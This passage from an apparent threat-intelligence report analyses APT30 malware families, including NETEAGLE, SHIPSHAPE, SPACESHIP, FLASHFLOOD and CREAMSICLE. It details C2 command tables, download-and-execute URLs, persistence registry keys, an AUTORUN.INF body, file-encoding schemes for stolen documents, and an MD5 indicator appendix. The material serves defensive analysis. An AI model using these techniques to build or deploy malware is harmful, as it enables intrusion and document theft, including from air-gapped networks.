Table 14: NETEAGLE “Scout” commands Command Meaning Command Meaning 0x02 Sends "NetEagle_Scout[hostname]\x00" 0x15 Get file attributes 0x03 List drives attached to the system (fixed, remote and CDROM) 0x16 Set file attributes 0x04 List directories 0x17 Get volume information 0x05 List directories with file details 0x18 Set the volume label 0x06 Rename a file or directory 0x19 Shell execute 0x07 Create file 0x20 Uninstall 0x08 Create directory 0x21 Search for file / directory 0x09 Delete file or directory 0x22 Sends “NETEAGLE_SCOUT” 0x10 Perform file operation 0x23 Get file information (size and last modified) 0x11 List directory contents 0x24 Establish a remote desktop session back to controller on TCP port 7519 0x12 Read file 0x25 Process listing 0x13 Write file 0x26 Read file 0x14 Get directory used space Finally, NETEAGLE downloads the URL hxxp://www.autoapec[.]com/yzstmfa/pic4.bmp. The response is decrypted with the same RC4 key ("ScoutEagle"). The format of the decrypted response is: [MD5 of file to be downloaded][URL] NETEAGLE downloads the URL to %temp%\Services.exe and executes the file. NETEAGLE BACKDOOR – “NORTON” VARIANT The “Norton” variants of the NETEAGLE backdoor (named for the mutex “Eagle-Norton360-OfficeScan” used by the malware) appear to have been developed later than that “Scout” versions, with early samples compiled in 2013. The NETEAGLE “Norton” sample 8a88f8803e8db8baee537a175960cdbe was compiled on 6 November 2013.
This version supports many of the same commands as the “Scout” version, but has several differences, including: The “Norton” variant does not include its own persistence mechanism.39 Use of a different mutex (“Eagle-Norton360-OfficeScan”). The “Norton” variant does not support the various HTTP requests to download and execute files (e.g., allupdate.xml, update.xml, updateapp.xml, and pic4.bmp). Although the “Norton” variant checks whether the victim host uses a proxy configuration, it always beacons using a proxy request. 40 Different encoding method for strings (“Norton” adds 2 instead of 4). Support of different / additional commands (see below).
Support for loading DLLs for additional functionality. The NETEAGLE “Norton” variant uses a similar process to identify its second-stage C2 server. The malware requests the file pic1.bmp from its first-stage C2 server using the following HTTP request: Similar to the “Scout” variant, the response is decrypted using the RC4 key “ScoutEagle” to obtain the IP address of the beacon server. The beacon format is the same as that used by the “Scout” variant. The NETEAGLE “Norton” variant will request the URL hxxp://www.creammemory[.]com/update1/pic2.
bmp and decrypt the response with the RC4 key “ScoutEagle”. The expected response format is the same as that for the “Scout” variant: [Hostname (up to 15 bytes)]\x00[Redirect IP in network byte order][Port] Figure 31: NETEAGLE "Norton" HTTP request GET /update1/pic1.bmp HTTP/1.1 User-Agent: [filename of malware] Host: www.creammemory.com  Table 15: NETEAGLE "Norton" commands that differ from "Scout" variant Command Meaning 0x20 Not implemented. 0x24 Load a DLL and call the DoWork export using DoWork([C2 IP] , 81, 4003, 4004). The encoded string representing the DLL filename does not decode correctly ("PCo^jb+aii", possibly intended to be "SFrame.dll"). 0x26 Not implemented.
0x27 Load a DLL and call the DoWork export using DoWork([C2 IP] , 82, 4015, 4016). The encoded string representing the DLL filename does not decode correctly ("PJrifq+aii", possibly intended to be "SMulit.dll"). 0x28 Load a DLL and call the DoWork export using DoWork([C2 IP] , 83, 4005, 4006). The encoded string representing the DLL filename does not decode correctly ("PQikq+aii", possibly intended to be "STlnt.dll"). 0x29 Load a DLL and call the DoWork export using DoWork([C2 IP] , 84, 4009, 4010).
The encoded string representing the DLL filename does not decode correctly ("PQikq+aii", possibly intended to be "SProc.dll"). The NETEAGLE “Norton” variant supports most of the same commands as the “Scout” variant, with the following exceptions: MALWARE TARGETING REMOVABLE DRIVES APT30 uses three pieces of malware that are believed to have been designed to propagate to removable drives with the intent of eventually infecting and stealing data from computers located on air-gapped networks. SHIPSHAPE SHIPSHAPE samples have been identified with compile times as early as 2006 and as recently as 2014. SHIPSHAPE initially targets removable and fixed drives with less than a specific amount of space available to the SHIPSHAPE process. Earlier samples required less than 1,000,000,000 bytes (~1GB); the sample described in detail below requires less than 10,000,000,000 bytes (0x2540BE400) or approximately 10GB.41 The intent is likely to use the drive to spread malware to additional systems.
The sample f18be055fae2490221c926e2ad55ab11 was compiled on 23 August, 2012. The malware replaces files and folders on targeted drives with executable files from specified paths on the SHIPSHAPEinfected system. 42 The specific files and folders replaced may vary based on the SHIPSHAPE sample. 43 Targeted files and folders are marked as hidden; SHIPSHAPE copies the specified executable file or files to the removable drive using the same names as the targeted files and folders, but with an .exe extension (for example, if the drive contained the file MyDocument.doc, SHIPSHAPE would create a file with the name MyDocument.doc.exe. A user attempting to access a “document” on the removable drive would potentially be tricked into running the executable instead.
It is believed that the executable will open the original document or folder when executed, to disguise the fact that malicious activity is occurring. When executed, SHIPSHAPE creates the mutex "MicrosoftShipZJ". The malware copies itself to %HOMEPATH%\My Documents\Visual Studio 2005\MSDEV\IDE\MSDEV.EXE. For persistence, SHIPSHAPE creates a shortcut in the user’s Startup folder named "Visual Studio.lnk" using the comment "Visual Studio 2005" and a target path of %HOMEPATH%\My Documents\Visual Studio 2005\MSDEV\IDE\MSDEV. EXE (variable is expanded).
The malware creates the registry key HKEY_LOCAL_MACHINE\Software\Microsoft\ShipUp with the following value and data: Value: lnk Data: Wjtvbm!Tuvejp/mol The data is the encoded name of the malware’s shortcut file (in this case, “Visual Studio.lnk”); the hexadecimal value of each character in the original file name is incremented by one (so “V” (0x56) becomes “W” (0x57) , etc.). SHIPSHAPE disables AutoRun and hides both hidden files and file extensions by setting the following registry values: HKCU\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\NoDriveTypeAutoRun = 0x9f HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden = 0x02 HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt = 0x01 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\ CheckedValue = 0x00 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\HideFileExt\ CheckedValue = 0xffffffff SHIPSHAPE searches for fixed and removable drives (DRIVE_FIXED, DRIVE_REMOVABLE). If a detected drive is less than 10,000,000,000 bytes (10GB) in size or was attached to the system after SHIPSHAPE performed its initial drive scan, SHIPSHAPE looks for the file ldupver.txt on the drive and parses the file for version information if the file is present. If the version listed in the file is greater than the malware’s current version ("50" for this sample), SHIPSHAPE will look for the file AUTORUN.INF on the drive and execute the "open" variable from the file, likely in an attempt to self-update. SHIPSHAPE will create (or update, if already present), the following AUTORUN.INF file on the drive: [AutoRun] open=keybd.exe shellexecute=keybd.exe shell\Auto\command=keybd.exe shell=Auto In addition, for drives that pass the size check (e.g., less than 10GB), SHIPSHAPE modifies folders and files on the drive with the .doc or .docx extension.
SHIPSHAPE sets the hidden attribute on the original folder or file and copies a new file to the drive using the same name with an .exe extension. For folders, SHIPSHAPE copies the contents of the file KB925273-dir.log from the SHIPSHAPE-infected computer to the drive; for files, SHIPSHAPE copies the contents of the file KB936891-doc.log. The malware will skip over any paths on the drive beginning with XP-Update, msdn, Recycled, or $LDDATA$. 44  SHIPSHAPE may use the following files (where [Install Path] is the path where SHIPSHAPE is installed on the victim computer: Table 16: Files used by SHIPSHAPE malware File Action [Install Path]\KB914268-inf.log Copied to keybd.exe on the removable disk Copied to [Install Path]\vers.ini [Install Path]\KB925273-dir.log Replaces directories on removable disk [Install Path]\KB936891-doc.log Replaces .doc, .docx files on removable disk [Install Path]\ldjs.txt Activity log upnum.txt Present in malware strings, but not used by this version [Install Path]\KB952567-mouse.log List of paths to be created on the removable disk and the files to be copied [Install Path]\NameList.doc Copied to the root of the removable disk ldupver.txt Used to store a version number (“50” for this variant) on a removable disk. SPACESHIP Similar to SHIPSHAPE, SPACESHIP samples have been identified with compile times ranging from 2006 to 2014.
SPACESHIP searches for files with a specified set of file extensions and copies them to a removable drive. FireEye believes that SHIPSHAPE is used to copy SPACESHIP to a removable drive, which could be used to infect another victim computer, including an air-gapped computer. SPACESHIP is then used to steal documents from the air-gapped system, copying them to a removable drive inserted into the SPACESHIP-infected system. The SPACESHIP sample 11876eaadeac34527c28f4ddfadd1e8d was compiled on 23 August, 2012. When executed, the malware creates two events named "MicrosoftShipTrExit" and "MicrosoftShipTrHaveExit" along with a mutex named "MicrosoftShipTrZJ".
The malware copies itself to %HOMEPATH%\My Documents\Visual Studio 2005\MSDEV\FoxPro\VFP6. EXE. To maintain persistence, the malware creates a shortcut in the user’s Startup folder named VFP6. lnk using the comment "Visual FoxPro" and the target path %HOMEPATH%\My Documents\Visual Studio 2005\MSDEV\FoxPro\VFP6.EXE (all %HOMEPATH% references are expanded). As part of the installation process, SPACESHIP creates the registry key HKEY_LOCAL_MACHINE\Software\ Microsoft\ShipTr with the following value and data: Value: lnk Data: WGQ7/mol  Similar to other APT30 malware, the data is the name of SPACESHIP’s shortcut file, with each character incremented by one.
SPACESHIP also creates the following directories: %HOMEPATH%\My Documents\Visual Studio 2005\MSDEV\FoxPro\Docs %HOMEPATH%\My Documents\Visual Studio 2005\MSDEV\FoxPro\Docs\ldf SPACESHIP first scans for files matching the pattern ldmap*.* in %HOMEPATH%\Documents\Visual Studio 2005\MSDEV\FoxPro\Docs\ldf. If a file is not found or is too old, the malware deletes the files ldmap.txt and Info.txt45 from %HOMEPATH%\My Documents\Visual Studio 2005\MSDEV\FoxPro\ Docs\. The malware then recursively scans each directory and logs all files contained in each folder (file size and last modified) in a new Info.txt file. SPACESHIP will look for configuration data stored in the file %HOMEPATH%\My Documents\Visual Studio 2005\MSDEV\FoxPro\ld.ini. The malware extracts the following keys from the sections: [DirMap] GetIt=[Integer] [Piece] Size=[Integer] [UpData] DirAndType=[String] [UpDataTime] Day=[Integer] SPACESHIP will scan the folders "My Documents" (CSIDL_PERSONAL), "Desktop" (CSIDL_DESKTOP), and “My Recent Documents" (CSIDL_RECENT; the malware parses the .lnk file target paths for specified file types) and will search for files with the following extensions: Table 17: SPACESHIP targeted file extensions File Extension Document Type .doc Microsoft Word document .docx Microsoft Word document .max MAX source code file (?) .pdf Adobe Acrobat Portable Document Format .pgp Pretty Good Privacy .rhs unknown .rtf Rich Text Format .tif Tagged Image Format graphics file .wpd Word Perfect Document  SPACESHIP can also target files based on the last modified date using the UpDataTime/Day in the ld.ini configuration file.
Identified files are copied to the %HOMEPATH%\Visual Studio 2005\MSDEV\FoxPro\Docs\ldf directory and saved with an .ldf extension. The .ldf files are first compressed using zlib then each byte is rotated 4 positions and XOR-encoded with 0x23. SPACESHIP monitors for removable drives to be inserted into the system. When a drive is attached, SPACESHIP checks for the presence of specific files on the removable drive. If the file [Drive Letter]:\msdn\d.ini is found, SPACESHIP copies it to %HOMEPATH%\Documents\ Visual Studio 2005\MSDEV\FoxProld.ini.
46 If the file [Drive Letter]:\msdn\KB947652-ver.log is present, SPACESHIP copies it to %HOMEPATH%\ Documents\Visual Studio 2005\MSDEV\FoxPro\KB947652-ver.log. SPACESHIP reads the contents of the file and compares it with its current version (the string "5.0” for this variant). If the strings do not match, SPACESHIP copies [Drive Letter]:\XP-Update\KB863113-ld.log to %HOMEPATH%\ Documents\Visual Studio 2005\MSDEV\FoxPro\~ld.exe and executes the file. SPACESHIP copies files in the %HOMEPATH%\Documents\Visual Studio 2005\MSDEV\FoxPro\Docs\ldf directory to the removable drive in the folder [Drive Letter]:\Recycled. A desktop.ini file is created that configures the directory to be opened using Recycler instead of Windows Explorer; this prevents a user from seeing the copied files using Windows Explorer.
FLASHFLOOD FLASHFLOOD appears to be an older piece of malware, or possibly one less frequently found “in the wild”; identified samples were compiled as early as 2005, but are less common (or nonexistent?) after 2009. FLASHFLOOD has some similarities to SPACESHIP, in that it will search for and archive files that match a configurable pattern; it even uses the same encoding process on archived files. One difference is that FLASHFLOOD will scan inserted removable drives for targeted files, and copy those files from the removable drive to the FLASHFLOOD-infected system. This may simply be yet another means to identify any “interesting” files for data theft, including those that happen to reside on a removable drive inserted into the victim computer. Alternately, FLASHFLOOD may have been designed to copy files that had been placed on a removable drive (perhaps by SPACESHIP), possibly copied from an “interesting” location such as an air-gapped network.
This theory is bolstered by the fact that one of the default file extensions searched for by FLASHFLOOD is .ldf, the extension used by SPACESHIP for copied and encoded files. FLASHFLOOD may also log or copy additional data from the victim computer, such as system information or contacts. The FLASHFLOOD sample 5d4f2871fd1818527ebd65b0ff930a77 was compiled on 17 February, 2009. When executed, the malware creates a mutex named "MicrosoftFlashZJ" and also creates two events named "MicrosoftFlashExit" and "MicrosoftFlashHaveExit". If the following registry key is not present, the malware creates it and continues the installation process: Key: HKLM\Software\Microsoft\GetInf Value: pid  Data: [Encoded filename of implant] The filename is encoded by incrementing the hex value of each ASCII character by one.
FLASHFLOOD copies itself to the file C:~a, then copies that file to %SystemDrive%\Program Files\ Outlook Express\msinm.exe. The malware changes to the target directory, executes msinm.exe and exits. To maintain persistence, FLASHFLOOD creates the following registry value: Key: HKLM\Software\Microsoft\Windows\CurrentVersion\Run Value: msinm.exe Data: [Path to install] FLASHFLOOD attempts to read the file %WINDIR%\FILETYPE.INI for a list of file patterns of interest. If the file does not exist the malware uses the following default file extensions: Table 18: Default file extensions searched for by FLASHFLOOD File Extension Document Type .doc Microsoft Word document .docx Microsoft Word document .ldf File extension used by SPACESHIP for copied and encoded files .max Autodesk 3ds Max CAD file .pdf Adobe Acrobat Portable Document Format .pgp Pretty Good Privacy .rhs unknown .rtf Rich Text Format .tif Tagged Image Format graphics file .wpd Word Perfect Document FLASHFLOOD creates the following directories, used to store malware log data and copied files of interest: %WINDIR%\$NtUninstallKB885884$\ %WINDIR%\$NtUninstallKB885884$\FlashFiles %WINDIR%\$NtUninstallKB885884$\LastFiles %WINDIR%\$NtUninstallKB885884$\RecentFiles  During initialization, FLASHFLOOD queries the registry value HKLM\SYSTEM\ CurrentControlSet\Services\SENS\Parameters\ServiceDll and logs the result to %WINDIR%\$NtUninstallKB885884$\Info.txt. 47 The file Info.txt is a general log file used by FLASHFLOOD to store information collected from the system.
FLASHFLOOD also logs information stored in the Windows Address Book using the IAddrBook interface.48 Information logged includes User, Nick, E-mail and Type. FLASHFLOOD parses the shortcut (.lnk) files from the user’s "My Recent Documents" folder and archives the target files to %WINDIR%\$NtUninstallKB885884$\RecentFiles. The malware uses the same format for archiving files as SPACESHIP; the original files are copied and an .ldf extension is added. The files are then zlib compressed and each byte is rotated 4 positions and XOR-encoded with 0x23. FLASHFLOOD creates the file %WINDIR%\FILETIME.DAT and writes the current system time to the file in FILETIME format.
49 The file is likely used to ensure the malware collects only recent files. FLASHFLOOD scans connected drives and the directories "Desktop", "Temporary Internet Files" and "TEMP" for files that match the patterns of interest (obtained from FILETYPE.INI or the default set of file extensions). Matching files are archived to %WINDIR%\$NtUninstallKB885884$\LastFiles. For drives attached to the system after FLASHFLOOD initially executes, the malware scans for files matching the patterns of interest. The malware’s behavior differs slightly depending on the size of the detected drive.
For drives with a capacity less than 2,500,000,000 bytes (approximately 2.5 GB),50 FLASHFLOOD scans the entire drive and will archive any files of interest found on the drive to %WINDIR%\$NtUninstallKB885884$\FlashFiles, using the archive method (compress, rotate bytes, XOR) described above. For any files found in the $LDDATA$ or RECYCLED directories, FLASHFLOOD will copy the file directly 51 (no archiving is performed) and delete the original file from the detected drive. For drives with a capacity greater than 2,500,000,000 bytes, FLASHFLOOD will only scan the directories $LDDATA$ and RECYCLED (if present). Any files found in these directories are copied to %WINDIR%\$NtUninstallKB885884$\FlashFiles and the original files are deleted. In both cases, details of the scan are logged to %WINDIR%\$NtUninstallKB885884$\OtherInfo.txt.
MISCELLANEOUS TOOLS In addition to the malware listed above, APT30 has used a variety of droppers, downloaders, and other utilities. In some cases, instead of directly installing a backdoor via a malicious document, APT30 will install a stage one downloader that attempts to retrieve a second stage backdoor (often NETEAGLE) from a specified location. MILKMAID / ORANGEADE Droppers and CREAMSICLE Downloader MILKMAID and ORANGEADE are two dropper families typically installed via a malicious attachment, such as a malicious Word document. Both droppers have been observed to drop variants of the CREAMSICLE downloader. MILKMAID drops a variant of CREAMSICLE implemented as a stand-alone executable, where the slightly older ORANGEADE drops a variant of CREAMSICLE implemented as a DLL.
52  Each dropper extracts its version of CREAMSICLE and creates a shortcut (.lnk) file that references the file to be downloaded by CREAMSICLE; that is, the dropper sets up persistence for the second stage downloaded file. “India deploys world's largest military transport plane.doc” (md5 hash 7d775a39ecd517cee4369c672e0e4da7) is an example of an exploit document – one built with a common document weaponizer that appears to be shared across multiple threat groups – that drops MILKMAID and the EXE variant of CREAMSICLE. The document creates the file firefox.exe (MILKMAID) and a nonmalicious decoy document (Wor.doc) in the user’s %TEMP% directory, executes firefox.exe, and displays the non-malicious document. MILKMAID extracts a compressed PE (readme.lz) from its resource section, decompresses it, and writes it to %APPDATA%\Norton360\Engine\5.1.0.29 as wssfmgr.exe (CREAMSICLE). MILKMAID creates the shortcut file Symantec LiveUpdate.lnk in the user’s Startup folder (%USERPROFILE%\Start Menu\Programs\Startup) with the target path %APPDATA%\Norton360\ Engine\5.1.0.29\ccSvcHst.exe (%APPDATA% is expanded).
Finally, MILKMAID launches CREAMSICLE (wssfmgr.exe). CREAMSICLE attempts to download an encoded executable from a specified location using the following HTTP request: Figure 32: CREAMSICLE download request GET /stactivex/update1.htm HTTP/1.1 User-Agent: Microsoft Internet Explorer Host: www.creammemory.com Cache-Control: no-cache The downloaded file is decoded, written to disk as %APPDATA%\Norton360\Engine\5.1.0.29\ccSvcHst. exe, and padded with 51,200,000 null bytes. CREAMSICLE does not appear to execute the downloaded file, presumably relying on Windows to do so (using the shortcut file in the user’s Startup folder) the next time the user logs in. BACKBEND and GEMCUTTER Downloaders BACKBEND and GEMCUTTER are older downloaders that have been previously used by APT30.
BACKBEND BACKBEND is a secondary downloader used as a backup mechanism in the case the primary backdoor is removed. The BACKBEND sample af504e86416c5f643e96f6e5e69566f0 was compiled on 16 August 2007. When executed, BACKBEND checks for the presence of the mutexes MicrosoftZj or MicrosoftZjBak (both associated with BACKSPACE variants). If either of the mutexes exist, the malware exits. If BACKBEND is not running from the C:\Program Files\Internet Explore folder as iexplore.exe, it creates the folder and copies itself as iexplore.exe to that location.
Next, if the current execution path of the malware process is not <CSIDL_STARTUP>\Update.exe, 53 it copies itself to that location to achieve persistence. Finally, BACKBEND starts the C:\Program Files\ Internet Explore\iexplore.exe process by providing the current path of the malware as the first command line parameter. If the malware process executable file path is C:\Program Files\Internet Explore\iexplore.exe, BACKSPACE deletes the file given by the first command line parameter passed in. Then, the malware downloads a file from hxxp://www.cbkjdxf[.]com/04-1/04-1.htm and saves it under Windows directory as netsvc.exe. 54 BACKSPACE starts a new process using the full path of the downloaded file (%windir%\netsvc.exe) and deletes <CSIDL_STARTUP>\Update.exe.
GEMCUTTER GEMCUTTER is used in a similar capacity as BACKBEND, but maintains persistence by creating a Windows registry run key. The GEMCUTTER sample bf8616bbed6d804a3dea09b230c2ab0c was compiled on 15 February, 2009. The malware starts by creating MicrosoftGMMExit and MicrosoftGMMHaveExit as non-signaled events. GEMCUTTER then queries for the registry value HKEY_LOCAL_MACHINE\Software\Microsoft\GetMM\ pid. If the value does not exist, the malware sets the registry value to the encoded malware process filename (each filename character incremented by one).
GEMCUTTER checks for the presence of the mutex MicrosoftGMMZJ to ensure only one copy of GEMCUTTER is executing. If the mutex doesn't exist, the malware creates it and continues execution; otherwise, the malware signals the MicrosoftGMMExit event. The malware performs cleanup by deleting the registry value with the same name as the malware filename under the HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run registry key and the file with the same name as the malware itself in the %sysdir% directory. If GEMCUTTER is not running from %sysdir% as CTFM0N.xxx (the file extension is excluded in the check), the malware copies itself to that location. The malware then starts a new process by providing %sysdir%\ CTFM0N.exe as the executable file path, and the current process exits.
If GEMCUTTER is running from %sysdir% as CTFM0N.xxx, the malware creates a new registry value under HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run, with the value and data set to CTFM0N.EXE. The registry value HKEY_LOCAL_MACHINE\Software\Microsoft\GetMM\pid is set to the DUGN1O/fyf (CTFM0N.EXE with each character incremented by 1). GEMCUTTER checks for the existence of the mutex MicrosoftZj (associated with BACKSPACE). If the mutex doesn't exist, GEMCUTTER downloads a file from hxxp://www.lisword[.]com/HM/Update.htm and saves it under %windir% as netsvc.exe. A new process is started using %windir%\netsvc.exe55 as the executable file path.
APPENDIX B MD5 HASHES Below are md5 hash values for a representative sample of APT30 malware. MD5 Hash Malware Family 002e27938c9390a942cf4b4c319f1768 BACKSPACE 062fe1336459a851bd0ea271bb2afe35 BACKSPACE 09010917cd00dc8ddd21aeb066877aa2 BACKSPACE 0fcb4ffe2eb391421ec876286c9ddb6c BACKSPACE 12e1dcd71693b6f875a98aefbd4ec91a BACKSPACE 1f64afa4069036513604cbf651e53e0d BACKSPACE 29395c528693b69233c1c12bef8a64b3 BACKSPACE 37e568bed4ae057e548439dc811b4d3a BACKSPACE 40f47850c5ebf768fd1303a32310c73e BACKSPACE 414854a9b40f7757ed7bfc6a1b01250f BACKSPACE 428fc53c84e921ac518e54a5d055f54a BACKSPACE 4c10a1efed25b828e4785d9526507fbc BACKSPACE 4c6b21e98ca03e0ef0910e07cef45dac BACKSPACE 4e5c116d874bbaaf7d6dadec7be926f5 BACKSPACE 550459b31d8dabaad1923565b7e50242 BACKSPACE 59e055cee87d8faf6f701293e5830b5a BACKSPACE 5ae51243647b7d03a5cb20dccbc0d561 BACKSPACE 5b590798da581c894d8a87964763aa8b BACKSPACE 62e5d5e244059dc02654f497401615cc BACKSPACE 65232a8d555d7c4f7bc0d7c5da08c593 BACKSPACE 853a20f5fc6d16202828df132c41a061 BACKSPACE 95bfe940816a89f168cacbc340eb4a5f BACKSPACE 9c0cad1560cd0ffe2aa570621ef7d0a0 BACKSPACE a5ca2c5b4d8c0c1bc93570ed13dcab1a BACKSPACE a9e8e402a7ee459e4896d0ba83543684 BACKSPACE acb2ba25ef225d820ac8a5923b746cb8 BACKSPACE  Below are md5 hash values for a representative sample of APT30 malware. MD5 Hash Malware Family b2138a57f723326eda5a26d2dec56851 BACKSPACE b590c15499448639c2748ff9e0d214b2 BACKSPACE b7b282c9e3eca888cbdb5a856e07e8bd BACKSPACE ba80e3ad617e6998f3c4b003397db840 BACKSPACE c95cd106c1fecbd500f4b97566d8dc96 BACKSPACE d38e02eac7e3b299b46ff2607dd0f288 BACKSPACE d8e68db503f4155ed1aeba95d1f5e3e4 BACKSPACE d93026b1c6c828d0905a0868e4cbc55f BACKSPACE db3e5c2f2ce07c2d3fa38d6fc1ceb854 BACKSPACE df1799845b51300b03072c6569ab96d5 BACKSPACE e26a2afaaddfb09d9ede505c6f1cc4e3 BACKSPACE e3ae3cbc024e39121c87d73e87bb2210 BACKSPACE e62a63307deead5c9fcca6b9a2d51fb0 BACKSPACE ec3905d8e100644ae96ad9b51d701a7f BACKSPACE ed151602dea80f39173c2f7b1dd58e06 BACKSPACE 07bb30a2a42423e54f70af61e20edca3 BACKSPACE 08f299c2d8cfe1ae64d71dfb15fe6e8d BACKSPACE 139158fe63a0e46639cc20b754a7c38c BACKSPACE 4a41c422e9eb29f5d722700b060bca11 BACKSPACE 646e2cfa6aa457013769e2b89454acf7 BACKSPACE 948a53450e1d7dc7535ea52ca7d5bddd BACKSPACE a2e0203e665976a13cdffb4416917250 BACKSPACE ad044dc0e2e1eaa19cf031dbcff9d770 BACKSPACE af1c1c5d8031c4942630b6a10270d8f4 BACKSPACE c6e388ee5269239070e5ad7336d0bf59 BACKSPACE c9484902c7f1756b26244d6d644c9dd5 BACKSPACE  Below are md5 hash values for a representative sample of APT30 malware. MD5 Hash Malware Family cc06815e8d8c0083263651877decb44b BACKSPACE dc95b0e8ecb22ad607fc912219a640c1 BACKSPACE f97ec83d68362e4dff4756ed1101fea8 BACKSPACE 572c9cd4388699347c0b2edb7c6f5e25 BACKSPACE 6e689351d94389ac6fdc341b859c7f6f BACKSPACE b5546842e08950bc17a438d785b5a019 BACKSPACE 010ca5e1de980f5f45f9d82027e1606c BACKSPACE 0570066887f44bc6c82ebe033cad0451 BACKSPACE 0a4fdacde69a566f53833500a0d53a35 BACKSPACE 1133fe501fa4691b7f52e53706c80df9 BACKSPACE 2a2b22aa94a59575ca1dea8dd489d2eb BACKSPACE 2d75de9e1bb58fe61fd971bb720a49b7 BACKSPACE 40601cf29c1bbfe0942d1ac914d8ce27 BACKSPACE 44992068aab25daa1decae93b25060af BACKSPACE 49ee6365618b2a5819d36a48131e280c BACKSPACE 4b8531d294c020d5f856b58a5a23b238 BACKSPACE 4ee00c46da143ba70f7e6270960823be BACKSPACE 5ddbd80720997f7a8ff53396e8e8b920 BACKSPACE 65b984b198359003a5a3b8aaf91af234 BACKSPACE 6791254f160e98ac1f46b4d506b695ad BACKSPACE 7b111e1054b6b929de071c4f48386415 BACKSPACE 8022a4136a6200580962da94f3cdb905 BACKSPACE 8214b0e18fbcd5db6b008884e7685f2c BACKSPACE 8da9373fc5b8320fb04d6202ca1eb6f1 BACKSPACE 9c31551cd8087072d08c9004c0ce76c5 BACKSPACE  Below are md5 hash values for a representative sample of APT30 malware. MD5 Hash Malware Family 9cbcc68c9b913a5fda445fbc7558c658 BACKSPACE 9e3ef98abcfffcf3205261e09e06cba6 BACKSPACE ab153afbfbcfc8c67cf055b0111f0003 BACKSPACE c90f798ccfbedb4bbe6c4568e0f05b68 BACKSPACE cb1087b2add3245418257d648ac9e9a7 BACKSPACE cd1aa1c8cdf4a4ba8dc4309ce30ec263 BACKSPACE d55514d8b97999453621a8614090cbf0 BACKSPACE d8248be5ed0f2f8f9787be331a18c36b BACKSPACE da92b863095ee730aef6c6c541ab7697 BACKSPACE f4a648a2382c51ca367be87d05628cff BACKSPACE ff00682b0b8c8d13b797d722d9048ea2 BACKSPACE 0cdc35ffc222a714ee138b57d29c8749 BACKSPACE 10aa368899774463a355f1397e6e5151 BACKSPACE 3166baffecccd0934bdc657c01491094 BACKSPACE d28d67b4397b7ce1508d10bf3054ffe5 BACKSPACE 310a4a62ba3765cbf8e8bbb9f324c503 BACKSPACE 23813c5bf6a7af322b40bd2fd94bd42e BACKSPACE 6508ee27afe517aa846f9447faef59b8 BACKSPACE 78c4fcee5b7fdbabf3b9941225d95166 BACKSPACE 8c713117af4ca6bbd69292a78069e75b BACKSPACE 8c9db773d387bf9b3f2b6a532e4c937c BACKSPACE ebf42e8b532e2f3b19046b028b5dfb23 BACKSPACE fe211c7a081c1dac46e3935f7c614549 BACKSPACE 6f931c15789d234881be8ae8ccfe33f4 BACKSPACE 1dbb584e19499e26398fb0a7aa2a01b7 BACKSPACE 37aee58655f5859e60ece6b249107b87 BACKSPACE  Below are md5 hash values for a representative sample of APT30 malware.
MD5 Hash Malware Family 4154548e1f8e9e7eb39d48a4cd75bcd1 BACKSPACE 71f25831681c19ea17b2f2a84a41bbfb BACKSPACE 8ff473bedbcc77df2c49a91167b1abeb BACKSPACE a813eba27b2166620bd75029cc1f04b0 BACKSPACE b4ae0004094b37a40978ef06f311a75e BACKSPACE c4dec6d69d8035d481e4f2c86f580e81 BACKSPACE 021e134c48cd9ce9eaf6a1c105197e5d NETEAGLE (Scout) 5eaf3deaaf2efac92c73ada82a651afe NETEAGLE (Scout) 7c307ca84f922674049c0c43ca09bec1 NETEAGLE (Scout) b8617302180d331e197cc0433fc5023d NETEAGLE (Scout) e6289e7f9f26be692cbe6f335a706014 NETEAGLE (Scout) 95bb314fe8fdbe4df31a6d23b0d378bc NETEAGLE (Norton) d97aace631d6f089595f5ce177f54a39 NETEAGLE (Norton) 0c4fcef3b583d0ffffc2b14b9297d3a4 SHIPSHAPE 1612b392d6145bfb0c43f8a48d78c75f SHIPSHAPE 168d207d0599ed0bb5bcfca3b3e7a9d3 SHIPSHAPE 1e6ee89fddcf23132ee12802337add61 SHIPSHAPE 42ccbccf48fe1cb63a81c9f094465ae2 SHIPSHAPE 4f00235b5208c128440c5693b7b85366 SHIPSHAPE 53f1358cbc298da96ec56e9a08851b4b SHIPSHAPE 5dd625af837e164dd2084b1f44a45808 SHIPSHAPE 9e27277ef0b6b25ccb2bb79dbf7554a7 SHIPSHAPE b249bcf741e076f11b6c9553f6104f16 SHIPSHAPE bbb3cb030686748b1244276e15085153 SHIPSHAPE c2acc9fc9b0f050ec2103d3ba9cb11c0 SHIPSHAPE e39756bc99ee1b05e5ee92a1cdd5faf4 SHIPSHAPE  Below are md5 hash values for a representative sample of APT30 malware. MD5 Hash Malware Family f18be055fae2490221c926e2ad55ab11 SHIPSHAPE 01d2383152795e4ec98b874cd585da30 SPACESHIP 08b54f9b2b3fb19e388d390d278f3e44 SPACESHIP 11876eaadeac34527c28f4ddfadd1e8d SPACESHIP 28f2396a1e306d05519b97a3a46ee925 SPACESHIP 80e39b656f9a77503fa3e6b7dd123ee3 SPACESHIP 8e2eee994cd1922e82dea58705cc9631 SPACESHIP b6c08fd8a9f32a17c3550d3b2d302dc5 SPACESHIP c4c068200ad8033a0f0cf28507b51842 SPACESHIP d591dc11ecffdfaf1626c1055417a50d SPACESHIP e9e514f8b1561011b4f034263c33a890 SPACESHIP 1b81b80ff0edf57da2440456d516cc90 FLASHFLOOD 5d4f2871fd1818527ebd65b0ff930a77 FLASHFLOOD 74b87086887e0c67ffb035069b195ac7 FLASHFLOOD af670600dee2bf13a68eb962cce8f122 FLASHFLOOD b5a343d11e1f7340de99118ce9fc1bbb FLASHFLOOD fad06d7b4450c4631302264486611ec3 FLASHFLOOD 49aca228674651cba776be727bdb7e60 MILKMAID 5c7a6b3d1b85fad17333e02608844703 MILKMAID 649fa64127fef1305ba141dd58fb83a5 MILKMAID 9982fd829c0048c8f89620691316763a MILKMAID baff5262ae01a9217b10fcd5dad9d1d5 MILKMAID b249bcf741e076f11b6c9553f6104f16 SHIPSHAPE bbb3cb030686748b1244276e15085153 SHIPSHAPE c2acc9fc9b0f050ec2103d3ba9cb11c0 SHIPSHAPE 